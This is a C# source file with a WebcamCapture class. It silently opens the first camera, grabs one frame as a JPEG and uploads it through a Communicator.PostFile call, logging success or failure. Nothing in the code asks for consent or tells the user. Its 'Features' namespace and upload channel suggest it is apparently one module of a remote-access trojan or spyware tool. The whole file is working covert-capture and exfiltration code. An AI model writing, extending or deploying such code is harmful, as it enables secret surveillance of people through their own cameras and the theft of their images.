using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading.Tasks;
using AForge.Video;
using AForge.Video.DirectShow;
using True.Core;

namespace True.Features
{
    public static class WebcamCapture
    {
        private static VideoCaptureDevice videoSource;
        private static TaskCompletionSource<byte[]> captureTcs;

        public static async Task CaptureAndSend()
        {
            try
            {
                byte[] imageData = await CaptureImageAsync();
                if (imageData != null)
                {
                    await Communicator.PostFile("webcam", imageData, "webcam.jpg");
                    Logger.Info("Webcam", "Webcam image sent.");
                }
                else
                {
                    Logger.Warn("Webcam", "Webcam image capture returned null.");
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Webcam", $"Error during webcam capture: {ex.Message}");
            }
        }

        private static Task<byte[]> CaptureImageAsync()
        {
            captureTcs = new TaskCompletionSource<byte[]>();

            var videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            if (videoDevices.Count == 0)
            {
                Logger.Warn("Webcam", "No webcam devices found.");
                return Task.FromResult<byte[]>(null);
            }

            videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
            videoSource.NewFrame += OnNewFrame;
            videoSource.Start();

            // Timeout after 5 seconds
            Task.Delay(5000).ContinueWith(_ =>
            {
                if (!captureTcs.Task.IsCompleted)
                {
                    Logger.Warn("Webcam", "Capture timed out.");
                    Cleanup();
                    captureTcs.TrySetResult(null);
                }
            });

            return captureTcs.Task;
        }

        private static void OnNewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            try
            {
                using (var bitmap = (Bitmap)eventArgs.Frame.Clone())
                using (var ms = new MemoryStream())
                {
                    bitmap.Save(ms, ImageFormat.Jpeg);
                    captureTcs.TrySetResult(ms.ToArray());
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Webcam", $"Failed to process frame: {ex.Message}");
                captureTcs.TrySetResult(null);
            }
            finally
            {
                Cleanup();
            }
        }

        private static void Cleanup()
        {
            if (videoSource != null && videoSource.IsRunning)
            {
                videoSource.SignalToStop();
                videoSource.NewFrame -= OnNewFrame;
                videoSource = null;
            }
        }
    }
}
